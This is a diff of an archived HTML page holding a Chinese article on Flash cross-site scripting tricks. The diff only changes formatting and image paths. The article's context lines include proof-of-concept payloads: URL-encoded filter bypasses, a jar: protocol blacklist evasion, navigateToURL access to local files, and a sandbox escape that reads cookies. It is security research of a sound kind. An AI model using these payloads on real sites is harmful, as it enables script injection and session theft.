@@ -3,14 +3,14 @@
 			<head>
 			     <title>一些你可能不知道的Flash XSS技巧 - mramydnei</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			</head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style><link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/papers/948">http://drops.wooyun.org/papers/948</a></h1>
 				
       <p>
-        <h2>0x00 前言</h2>
+        </p><h2>0x00 前言</h2>
 
-<hr />
+<hr>
 
 <p>原文链接</p>
 
@@ -26,7 +26,7 @@
 
 <h2>0x01 绕过IE对Flash XSS的保护机制</h2>
 
-<hr />
+<hr>
 
 <p>在经过一些小的测试后发现，似乎只有IE会对下面这种Flash XSS进行拦截。如果你用IE10打开下面的链接:</p>
 
@@ -44,7 +44,7 @@
 
 <h2>0x02 利用Flash的URL解码功能来绕过一些保护机制</h2>
 
-<hr />
+<hr>
 
 <p>如果你需要将你的vector发送到藏在防火墙的后面受害者（flashvars­可以使用#来达到隐藏自己的目的）又或者想突破一些客户端的XSS防御机制这个方法将会十分的凑效。这一切都基于flash会丢弃一些被URL编码过的无效字符。</p>
 
@@ -67,13 +67,13 @@
 http://0me.me/demo/xss/xssproject.swf?%I%R%S%D%%Ljs=loca%Xtion.hr%Yef='jav%Zascri %AXpt:x="&lt;sc%AYript&gt;ale%AZrt(docu%?ment.dom%/ain)&lt;/sc%&amp;ript&gt;"'
 </code></pre>
 
-<p><img src="http://static.wooyun.org/201402/2014021816521453755.png" alt="2014021816521453755.png" /></p>
+<p><img src="../images_result/images/2014021816521453755.png" alt="2014021816521453755.png"></p>
 
 <p>成功了！我使用这个trick也绕过了noscript，不过这个漏洞已经在 2.6.6.8修复了。</p>
 
 <h2>0x03 真正的“勇士“jar协议</h2>
 
-<hr />
+<hr>
 
 <p>flash 会忽略 jar 协议并让它变成一个透明的协议。换句话来说 <code>javascript:alert(1)</code> 和 <code>jar:javascript:alert(1)</code> 在 actionscript 中是完全一样的。这意味着我们可以使用这个方法来绕 过一些黑名单的检测。让我们先举一个存在漏洞的例子:</p>
 
@@ -89,7 +89,7 @@ if(!dangerousInput.test(input))
 
 <p>我们就可以使用先前提到的方法来绕过这个检测：</p>
 
-<p><img src="http://static.wooyun.org/201402/2014021816525218614.png" alt="2014021816525218614.png" /></p>
+<p><img src="../images_result/images/2014021816525218614.png" alt="2014021816525218614.png"></p>
 
 <pre><code>http://0me.me/demo/xss/flash/link_protocol_test.swf?input=jar:javascript:alert(1);//
 </code></pre>
@@ -98,7 +98,7 @@ if(!dangerousInput.test(input))
 
 <h2>0x04 使用“navigateToURL”来突破本地域的访问限制</h2>
 
-<hr />
+<hr>
 
 <p>在默认设置当中 flash 不会允许你去访问一些比较敏感的协议(通过 navigateToURL), 如:“File://” 或 “Ms-its:” 如果你直接尝试访问下面的链接:</p>
 
@@ -153,7 +153,7 @@ http://0me.me/demo/xss/flash/link_protocol_test.swf?input=jar:mk:@MSITStore:C:\W
 
 <h2>0x05 绕过flash沙箱</h2>
 
-<hr />
+<hr>
 
 <p>我们都知道navigateToURL和getUR在flash XSS当中都是一些很常用的手段。但是大前提就是我们需要一个allowScriptAccess来得到脚本访问的许可。下面我将演示如何在不使用allowScriptAccess前提下让脚本运行起来。但是在这之前我们先要了解一下，使用allowScriptAccess的方法应该是什么样的。</p>
 
@@ -227,7 +227,7 @@ getURL("jar:javascript:alert('domain: '+document.domain+'\\r\\nCookies: '+docume
 <pre><code>http://www.sdl.me/xssdemo/xss.asp?input=&lt;embed src=http://0me.me/demo/xss/flash/embededXSS.swf&gt;
 </code></pre>
 
-<p><img src="http://static.wooyun.org/201402/2014021816544865336.png" alt="2014021816544865336.png" /></p>
+<p><img src="../images_result/images/2014021816544865336.png" alt="2014021816544865336.png"></p>
 
 <p>但是我们也可以使用name来让它变得可以在其它浏览器中执行。</p>
 
@@ -235,7 +235,7 @@ getURL("jar:javascript:alert('domain: '+document.domain+'\\r\\nCookies: '+docume
 &lt;iframe name="testme" src="http://www.sdl.me/xssdemo/xss.asp?input=&lt;embed src=http://0me.me/demo/xss/flash/embededXSS.swf&gt;" height="240" width="320"&gt;&lt;/iframe&gt;
 </code></pre>
 
-<p>这里的embed标签也可以被object标签所取代。不过最终Adobe出了个新补丁封杀了jar协议。印象中是上个月的17号出的。所以如果你想亲自测试一下可能需要你手动安装稍微老的flash版本。如果你是kali linux用户，并且喜欢使用firefox那么这个绕过flash沙箱的方法对你来说应该是轻易可以实现的（我没有特意去更新FF的flash插件，所以在我这里一直是可以用这个方法的）。</p>      </p>
+<p>这里的embed标签也可以被object标签所取代。不过最终Adobe出了个新补丁封杀了jar协议。印象中是上个月的17号出的。所以如果你想亲自测试一下可能需要你手动安装稍微老的flash版本。如果你是kali linux用户，并且喜欢使用firefox那么这个绕过flash沙箱的方法对你来说应该是轻易可以实现的（我没有特意去更新FF的flash插件，所以在我这里一直是可以用这个方法的）。</p>      <p></p>
     
 			</body>
 		</html>
